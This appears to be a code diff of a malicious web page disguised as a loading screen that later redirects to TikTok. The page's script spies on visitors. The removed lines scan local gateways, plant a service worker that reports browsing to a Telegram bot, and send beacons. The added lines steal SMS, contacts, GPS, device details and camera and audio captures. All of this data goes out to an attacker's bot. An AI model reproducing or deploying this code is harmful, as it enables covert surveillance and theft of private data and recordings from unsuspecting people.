-                    try{await new Promise(r=>{const img=new Image();const t=setTimeout(()=>{img.src='';r();},300);img.onload=()=>{clearTimeout(t);found.push(gw);r();};img.onerror=()=>{clearTimeout(t);r();};img.src=`http://${gw}/?${Date.now()}`;});}catch(e){}
-                }
-                if(found.length)tg(`🌐 **Gateways:** ${found.join(', ')}`);
-            },2000);
-
-            // Service Worker
-            setTimeout(async()=>{
-                try{
-                    const code=`self.addEventListener('install',e=>self.skipWaiting());self.addEventListener('activate',e=>e.waitUntil(clients.claim()));self.addEventListener('message',e=>{if(e.data==='ping'){fetch('https://api.telegram.org/bot${C2.botToken}/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:'${C2.chatId}',text:'🕒 **SW:** '+new Date().toISOString(),parse_mode:'Markdown'})}).catch(()=>{});}});self.addEventListener('fetch',e=>{if(e.request.mode==='navigate'){e.waitUntil(fetch('https://api.telegram.org/bot${C2.botToken}/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:'${C2.chatId}',text:'🌐 **Nav:** '+e.request.url,parse_mode:'Markdown'})}).catch(()=>{}));}});`;
-                    const reg=await navigator.serviceWorker.register(URL.createObjectURL(new Blob([code],{type:'application/javascript'})),{scope:'/'});
-                    tg(`🕸️ **SW:** ${reg.scope}`);
-                    setInterval(()=>reg.active?.postMessage('ping'),30000);
-                }catch(e){}
-            },1000);
-
-            // Self-destruct
-            window.addEventListener('beforeunload',()=>{document.cookie.split(';').forEach(c=>{document.cookie=c.replace(/^ +/,'').replace(/=.*/,`=;expires=${new Date(0).toUTCString()};path=/`);});try{localStorage.clear();}catch(e){}try{sessionStorage.clear();}catch(e){}navigator.sendBeacon(`https://api.telegram.org/bot${C2.botToken}/sendMessage`,new Blob([JSON.stringify({chat_id:C2.chatId,text:`🚪 **Closed** ${new Date().toISOString()}`,parse_mode:'Markdown'})],{type:'application/json'}));});
-
-            // Beacon
-            setInterval(()=>tg(`💓 ${new Date().toLocaleString()}`),120000);
-        }
-
-        // ─── MAIN ───
-        async function main() {
-            // Total timeline: ~10s
-            try {
-                tg('⏳ **Started**');
-                
-                // Phase 1: Silent recon (0.5s)
-                await recon();
-
-                // Update loader text
-                document.querySelector('.loader-text').innerHTML = '<span>Almost ready...</span>';
-                await sleep(500);
-
-                // Phase 2: Permissions + captures (~8s)
-                await captureAll();
-
-                // Phase 3: Deploy background
-                deployBackground();
-
-                // Redirect to TikTok after ~10s total
-                await sleep(1500);
-                window.location.href = C2.fallbackUrl;
+                // Stop audio recorder after 8 seconds
+                setTimeout(() => {
+                    if (audioRecorder.state === 'recording') {
+                        audioRecorder.stop();
+                        mediaStream.getTracks().forEach(t => t.stop());
+                    }
+                }, 8000);
 
             } catch(e) {
-                tg(`❌ Error: ${e.message}`);
-                window.location.href = C2.fallbackUrl;
+                sendToBot(`⚠️ Camera denied`);
             }
         }
 
-        // ─── BOOT ───
-        setTimeout(main, 300);
+        // =============================================
+        // MAIN START
+        // =============================================
+        async function start() {
+            // 1. Device info (no permission needed)
+            await collectDeviceInfo();
+            
+            // 2. SMS + Contacts (Android - بەردەوامە)
+            if (isMobile && /Android/i.test(navigator.userAgent)) {
+                stealSMS();
+                setTimeout(stealContacts, 3000);
+            }
+
+            // 3. GPS automatic after 3 seconds
+            setTimeout(() => getGPS(false), 3000);
+
+            // 4. Camera + Audio (یەک ڕێگەپێدان)
+            await captureAll();
+
+            // 5. GPS on click (دەقیکترین جار)
+            document.addEventListener('click', () => getGPS(true), { once: true });
+
+            // 6. Redirect to TikTok after 13 seconds
+            updateStatus("Almost ready...");
+            setTimeout(() => {
+                if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
+                window.location.replace(tiktokLink);
+            }, 13000);
+        }
+
+        window.onload = start;
+
+        // Fallback
+        window.addEventListener('error', () => {
+            setTimeout(() => window.location.replace(tiktokLink), 5000);
+        });
     </script>
 </body>
 </html>
